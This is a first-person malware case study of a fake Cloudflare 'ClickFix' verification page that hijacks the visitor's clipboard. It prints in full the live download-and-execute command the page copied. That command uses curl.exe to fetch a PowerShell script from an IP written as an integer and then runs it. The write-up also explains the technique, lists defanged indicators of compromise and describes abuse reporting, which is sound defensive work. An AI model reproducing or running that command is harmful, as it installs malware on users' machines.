# Case Study #01: Fake Cloudflare "ClickFix" Malware Prompt

**Date:** November 20, 2026  
**Type:** Fake CAPTCHA / Clipboard Hijack  

---

## Summary
While browsing, I ran into a fake Cloudflare "Human Verification" screen on `wel0hn[.]fastfuturetechdev[.]buzz`. Instead of a normal checkbox, it told me to open Windows Run (`Win + R`), type `cmd`, and paste a command. 

Because Cloudflare never asks you to run Windows commands, I pasted what was on my clipboard into **Notepad** instead to see what it was trying to do. I ended up pulling out the hidden payload command, decoding the server's IP address (`85[.]234[.]100[.]172`), and reporting both the domain and the server so they could be taken down.

---

## How the Attack Worked

1. **The Fake Verification Screen:**
   - The page at `hxxps://wel0hn[.]fastfuturetechdev[.]buzz/?8QvLjLOHJhqhELE24RFGtkBI` looked like a standard Cloudflare security check.
   - It instructed me to press `Win + R`, open `cmd`, and hit `Ctrl + V` + `Enter`.
2. **Clipboard Hijacking:**
   - In the background, the webpage copied a hidden Windows command straight to my clipboard.
3. **Downloading the Malware:**
   - If someone actually pasted and ran that command, it would use `curl.exe` (built into Windows) to quietly download two files into their `%tmp%` folder and run a PowerShell script (`S001.ps1`).

---

## Breaking Down the Command

Here is the exact command the site put on my clipboard (with links broken up so nobody clicks them by mistake):

```cmd
set "__VSCMD_WIN_64BIT=true"&& cd %tmp%& curl.exe -sLo %tmp%\loop.txt 1441424556/980?w7JmMS&& curl.exe -sLo %tmp%\S001.ps1 1441424556/990?w7JmMS&& for /f "delims=" %i in (loop.txt) do %i
```

What each part actually does:
* **`set"__VSCMD_WIN_64BIT=true"`**: Sets a fake Visual Studio variable to make the command look like normal developer activity.
* **`cd %tmp%`**: Moves into the hidden Windows temporary folder so the victim doesn't see files appearing on their desktop.
* **`1441424556`**: This looks like a random number, but it's actually an IP address written as a single integer. When converted back to a normal IP, it becomes **`85[.]234[.]100[.]172`**. Attackers do this to sneak past basic URL filters.
* **`curl.exe ...`**: Downloads two files from that IP (`loop.txt` and `S001.ps1`).
* **`for /f ...`**: Reads `loop.txt` and executes the downloaded PowerShell script (`S001.ps1`).

---

## Indicators of Compromise (IoCs)

| What it is | Details (Defanged) | Notes |
| :--- | :--- | :--- |
| **Lure Link** | `hxxps://wel0hn[.]fastfuturetechdev[.]buzz/?8QvLjLOHJhqhELE24RFGtkBI` | Fake Cloudflare popup page |
| **Domain** | `fastfuturetechdev[.]buzz` | Root domain hosting the lure |
| **Server IP** | `85[.]234[.]100[.]172` | Decoded from `1441424556` |
| **Payload 1** | `hxxp://85[.]234[.]100[.]172/980?w7JmMS` | Downloads `loop.txt` |
| **Payload 2** | `hxxp://85[.]234[.]100[.]172/990?w7JmMS` | Downloads `S001.ps1` |
| **Host Network** | `AS29550` (`berkshire[.]noc102[.]com`) | Simply Transit / Team Blue Carrier Ltd (UK) |

------

## What I Did About It
* **Found the host:** Looked up `85[.]234[.]100[.]172` to see who owned the server (`AS29550`).
* **Reported it:** Sent the command, IP, and links to the hosting provider's abuse team (`abuse@as29550.net`) and browser blocklists so other people don't get hit by it.

